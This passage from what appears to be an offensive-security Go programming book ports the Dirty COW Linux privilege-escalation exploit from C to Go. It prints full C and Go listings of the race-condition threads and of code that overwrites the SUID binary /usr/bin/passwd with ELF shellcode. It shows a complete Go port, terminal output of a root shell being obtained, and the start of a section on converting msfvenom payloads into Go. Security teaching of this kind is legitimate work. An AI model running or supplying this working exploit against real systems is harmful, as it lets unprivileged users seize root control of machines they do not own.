case<-signals:❶
fmt.Println("madvisedone")
return
default:
syscall.Syscall(syscall.SYS_MADVISE,mapp,uintptr(100),
syscall.MADV_DONTNEED)❷
}
}
}
funcprocselfmem(payload[]byte){
f,err:=os.OpenFile("/proc/self/mem",syscall.O_RDWR,0)
iferr!=nil{
log.Fatal(err)
}
fori:=0;i<1000000;i++{
select{
case<-signals:❶
fmt.Println("procselfmemdone")
return
default:
syscall.Syscall(syscall.SYS_LSEEK,f.Fd(),mapp,uintptr(os.SEEK_SET))
❸
f.Write(payload)❹
}
}
}
Listing9-9:RaceconditionfunctionsinGo
Theraceconditionfunctionsusevariationsforsignaling
❶.Bothfunctionscontainforloopsthatiterateanextensive
numberoftimes.TheCversionchecksthevalueofthestop
variable,whiletheGoversionusesaselectstatementthat
attemptstoreadfromthesignalschannel.Whenasignalis
present,thefunctionreturns.Intheeventthatnosignalis
waiting,thedefaultcaseexecutes.Theprimarydifferences
betweenthemadvise()andprocselfmem()functionsoccurwithinthe
defaultcase.Withinourmadvise()function,youissueaLinux
systemcalltothemadvise()❷function,whereasyour
procselfmem()functionissuesLinuxsystemcallstolseek()❸and
writesyourpayloadtomemory❹.
HerearethemaindifferencesbetweentheCandGo
versionsofthesefunctions:
TheGoversionusesachanneltodeterminewhentoprematurelybreaktheloop,
whiletheCfunctionusesanintegervaluetosignalwhentobreaktheloopafter
thethreadraceconditionhasoccurred.
TheGoversionusesthesyscallpackagetoissueLinuxsystemcalls.The
parameterspassedtothefunctionincludethesystemfunctiontobecalledandits
requiredparameters.Youcanfindthename,purpose,andparametersofthe
functionbysearchingLinuxdocumentation.Thisishowweareabletocall
nativeLinuxfunctions.
Now,let’sreviewthewaitForWrite()function,whichmonitors
forthepresenceofchangestoSUIDinordertoexecutethe
shellcode.TheCversionisshowninListing9-10,andtheGo
versionisshowninListing9-11.
void*waitForWrite(void*arg){
charbuf[sc_len];
❶for(;;){
FILE*fp=fopen(suid_binary,"rb");
fread(buf,sc_len,1,fp);
if(memcmp(buf,sc,sc_len)==0){
printf("%sisoverwritten\n",suid_binary);
break;
}
fclose(fp);
sleep(1);
}
❷stop=1;
printf("Poppingrootshell.\n");
printf("Don'tforgettorestore/tmp/bak\n");
❸system(suid_binary);
}
Listing9-10:ThewaitForWrite()functioninC
funcwaitForWrite(){
buf:=make([]byte,len(sc))
❶for{
f,err:=os.Open(SuidBinary)
iferr!=nil{
log.Fatal(err)
}
if_,err:=f.Read(buf);err!=nil{
log.Fatal(err)
}
f.Close()
ifbytes.Compare(buf,sc)==0{
fmt.Printf("%sisoverwritten\n",SuidBinary)
break
}
time.Sleep(1*time.Second)
}
❷signals<-true
signals<-true
fmt.Println("Poppingrootshell")
fmt.Println("Don'tforgettorestore/tmp/bak\n")
attr:=os.ProcAttr{
Files:[]*os.File{os.Stdin,os.Stdout,os.Stderr},
}
proc,err:=os.StartProcess(SuidBinary,nil,&attr)❸
iferr!=nil{
log.Fatal(err)
}
proc.Wait()
os.Exit(0)
}
Listing9-11:ThewaitForWrite()functioninGo
Inbothcases,thecodedefinesaninfiniteloopthat
monitorstheSUIDbinaryfileforchanges❶.WhiletheC
versionusesmemcmp()tocheckwhethertheshellcodehasbeen
writtentothetarget,theGocodeusesbytes.Compare().Whenthe
shellcodeispresent,you’llknowtheexploitsucceededin
overwritingthefile.Youthenbreakoutoftheinfiniteloop
andsignaltherunningthreadsthattheycannowstop❷.As
withthecodefortheraceconditions,theGoversiondoesthis
viaachannel,whiletheCversionusesaninteger.Lastly,you
executewhatisprobablythebestpartofthefunction:the
SUIDtargetfilethatnowhasyourmaliciouscodewithinit❸.
TheGoversionisalittlebitmoreverbose,asyouneedtopass
inattributescorrespondingtostdin,stdout,andstderr:files
pointerstoopeninputfiles,outputfiles,anderrorfile
descriptors,respectively.
Nowlet’slookatourmain()function,whichcallsthe
previousfunctionsnecessarytoexecutethisexploit.Listing9-
12showstheCversion,andListing9-13showstheGo
version.
intmain(intargc,char*argv[]){
char*backup;
printf("DirtyCowrootprivilegeescalation\n");
printf("Backingup%s..to/tmp/bak\n",suid_binary);
❶asprintf(&backup,"cp%s/tmp/bak",suid_binary);
system(backup);
❷f=open(suid_binary,O_RDONLY);
fstat(f,&st);
printf("Sizeofbinary:%d\n",st.st_size);
❸charpayload[st.st_size];
memset(payload,0x90,st.st_size);
memcpy(payload,sc,sc_len+1);
❹map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
printf("Racing,thismaytakeawhile..\n");
❺pthread_create(&pth1,NULL,&madviseThread,suid_binary);
pthread_create(&pth2,NULL,&procselfmemThread,payload);
pthread_create(&pth3,NULL,&waitForWrite,NULL);
pthread_join(pth3,NULL);
return0;
}
Listing9-12:Themain()functioninC
funcmain(){
fmt.Println("DirtyCowrootprivilegeescalation")
fmt.Printf("Backingup%s..to/tmp/bak\n",SuidBinary)
❶backup:=exec.Command("cp",SuidBinary,"/tmp/bak")
iferr:=backup.Run();err!=nil{
log.Fatal(err)
}
❷f,err:=os.OpenFile(SuidBinary,os.O_RDONLY,0600)
iferr!=nil{
log.Fatal(err)
}
st,err:=f.Stat()
iferr!=nil{
log.Fatal(err)
}
fmt.Printf("Sizeofbinary:%d\n",st.Size())
❸payload:=make([]byte,st.Size())
fori,_:=rangepayload{
payload[i]=0x90
}
fori,v:=rangesc{
payload[i]=v
}
❹mapp,_,_=syscall.Syscall6(
syscall.SYS_MMAP,
uintptr(0),
uintptr(st.Size()),
uintptr(syscall.PROT_READ),
uintptr(syscall.MAP_PRIVATE),
f.Fd(),
0,
)
fmt.Println("Racing,thismaytakeawhile..\n")
❺gomadvise()
goprocselfmem(payload)
waitForWrite()
}
Listing9-13:Themain()functioninGo
Themain()functionstartsbybackingupthetarget
executable❶.Sinceyou’lleventuallybeoverwritingit,you
don’twanttolosetheoriginalversion;doingsomayadversely
affectthesystem.WhileCallowsyoutorunanoperating
systemcommandbycallingsystem()andpassingittheentire
commandasasinglestring,theGoversionreliesonthe
exec.Command()function,whichrequiresyoutopassthe
commandasseparatearguments.Next,youopentheSUID
targetfileinread-onlymode❷,retrievingthefilestats,and
thenusethemtoinitializeapayloadsliceofidenticalsizeas
thetargetfile❸.InC,youfillthearraywithNOP(0x90)
instructionsbycallingmemset(),andthencopyoveraportionof
thearraywithyourshellcodebycallingmemcpy().Theseare
conveniencefunctionsthatdon’texistinGo.
Instead,inGo,youloopoverthesliceelementsand
manuallypopulatethemonebyteatatime.Afterdoingso,
youissueaLinuxsystemcalltothemapp()function❹,which
mapsthecontentsofyourtargetSUIDfiletomemory.Asfor
previoussystemcalls,youcanfindtheparametersneededfor
mapp()bysearchingtheLinuxdocumentation.Youmaynotice
thattheGocodeissuesacalltosyscall.Syscall6()ratherthan
syscall.Syscall().TheSyscall6()functionisusedforsystemcallsthat
expectsixinputparameters,asisthecasewithmapp().Lastly,
thecodespinsupacoupleofthreads,callingthemadvise()and
procselfmem()functionsconcurrently❺.Astheracecondition
ensues,youcallyourwaitForWrite()function,whichmonitorsfor
changestoyourSUIDfile,signalsthethreadstostop,and
executesyourmaliciouscode.
Forcompleteness,Listing9-14showstheentiretyofthe
portedGocode.
varmappuintptr
varsignals=make(chanbool,2)
constSuidBinary="/usr/bin/passwd"
varsc=[]byte{
0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,
--snip--
0x68,0x00,0x56,0x57,0x48,0x89,0xe6,0x0f,0x05,
}
funcmadvise(){
fori:=0;i<1000000;i++{
select{
case<-signals:
fmt.Println("madvisedone")
return
default:
syscall.Syscall(syscall.SYS_MADVISE,mapp,uintptr(100),
syscall.MADV_DONTNEED)
}
}
}
funcprocselfmem(payload[]byte){
f,err:=os.OpenFile("/proc/self/mem",syscall.O_RDWR,0)
iferr!=nil{
log.Fatal(err)
}
fori:=0;i<1000000;i++{
select{
case<-signals:
fmt.Println("procselfmemdone")
return
default:
syscall.Syscall(syscall.SYS_LSEEK,f.Fd(),mapp,uintptr(os.SEEK_SET))
f.Write(payload)
}
}
}
funcwaitForWrite(){
buf:=make([]byte,len(sc))
for{
f,err:=os.Open(SuidBinary)
iferr!=nil{
log.Fatal(err)
}
if_,err:=f.Read(buf);err!=nil{
log.Fatal(err)
}
f.Close()
ifbytes.Compare(buf,sc)==0{
fmt.Printf("%sisoverwritten\n",SuidBinary)
break
}
time.Sleep(1*time.Second)
}
signals<-true
signals<-true
fmt.Println("Poppingrootshell")
fmt.Println("Don'tforgettorestore/tmp/bak\n")
attr:=os.ProcAttr{
Files:[]*os.File{os.Stdin,os.Stdout,os.Stderr},
}
proc,err:=os.StartProcess(SuidBinary,nil,&attr)
iferr!=nil{
log.Fatal(err)
}
proc.Wait()
os.Exit(0)
}
funcmain(){
fmt.Println("DirtyCowrootprivilegeescalation")
fmt.Printf("Backingup%s..to/tmp/bak\n",SuidBinary)
backup:=exec.Command("cp",SuidBinary,"/tmp/bak")
iferr:=backup.Run();err!=nil{
log.Fatal(err)
}
f,err:=os.OpenFile(SuidBinary,os.O_RDONLY,0600)
iferr!=nil{
log.Fatal(err)
}
st,err:=f.Stat()
iferr!=nil{
log.Fatal(err)
}
fmt.Printf("Sizeofbinary:%d\n",st.Size())
payload:=make([]byte,st.Size())
fori,_:=rangepayload{
payload[i]=0x90
}
fori,v:=rangesc{
payload[i]=v
}
mapp,_,_=syscall.Syscall6(
syscall.SYS_MMAP,
uintptr(0),
uintptr(st.Size()),
uintptr(syscall.PROT_READ),
uintptr(syscall.MAP_PRIVATE),
f.Fd(),
0,
)
fmt.Println("Racing,thismaytakeawhile..\n")
gomadvise()
goprocselfmem(payload)
waitForWrite()
}
Listing9-14:ThecompleteGoport(/ch-9/dirtycow/main.go/)
Toconfirmthatyourcodeworks,runitonyourvulnerable
host.There’snothingmoresatisfyingthanseeingarootshell.
alice@ubuntu:~$gorunmain.go
DirtyCowrootprivilegeescalation
Backingup/usr/bin/passwd..to/tmp/bak
Sizeofbinary:47032
Racing,thismaytakeawhile..
/usr/bin/passwdisoverwritten
Poppingrootshell
procselfmemdone
Don'tforgettorestore/tmp/bak
root@ubuntu:/home/alice#id
uid=0(root)gid=1000(alice)groups=0(root),4(adm),1000(alice)
Asyoucansee,asuccessfulrunoftheprogrambacksup
the/usr/bin/passwdfile,racesforcontrolofthehandle,
overwritesthefilelocationwiththenewlyintendedvalues,
andfinallyproducesasystemshell.TheoutputoftheLinuxid
commandconfirmsthatthealiceuseraccounthasbeenelevated
toauid=0value,indicatingroot-levelprivilege.
CREATINGSHELLCODEINGO
Intheprevioussection,youusedrawshellcodeinvalidELF
formattooverwritealegitimatefilewithyourmalicious
alternative.Howmightyougeneratethatshellcodeyourself?
Asitturnsout,youcanuseyourtypicaltoolsettogenerate
Go-friendlyshellcode.
We’llshowyouhowtodothiswithmsfvenom,acommand-
lineutility,buttheintegrationtechniqueswe’llteachyou
aren’ttool-specific.Youcanuseseveralmethodstoworkwith
externalbinarydata,beitshellcodeorsomethingelse,and
integrateitintoyourGocode.Restassuredthatthefollowing
pagesdealmorewithcommondatarepresentationsthan
anythingspecifictoatool.
TheMetasploitFramework,apopularexploitationand
post-exploitationtoolkit,shipswithmsfvenom,atoolthat
generatesandtransformsanyofMetasploit’savailable
payloadstoavarietyofformatsspecifiedviathe-fargument.
Unfortunately,thereisnoexplicitGotransform.However,
youcanintegrateseveralformatsintoyourGocodefairly
easilywithminoradjustments.We’llexplorefiveofthese
formatshere:C,hex,num,raw,andBase64,whilekeepingin
mindthatourendgoalistocreateabytesliceinGo.
CTransform
IfyouspecifyaCtransformtype,msfvenomwillproducethe
payloadinaformatthatyoucandirectlyplaceintoCcode.
Thismayseemlikethelogicalfirstchoice,sincewedetailed
manyofthesimilaritiesbetweenCandGoearlierinthis
chapter.However,it’snotthebestcandidateforourGocode.
Toshowyouwhy,lookatthefollowingsampleoutputinC
format:
unsignedcharbuf[]=
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
--snip--
"\x64\x00";
We’reinterestedalmostexclusivelyinthepayload.To
makeitGo-friendly,you’llhavetoremovethesemicolonand
alterthelinebreaks.Thismeansyou’lleitherneedto
explicitlyappendeachlinebyaddinga+totheendofalllines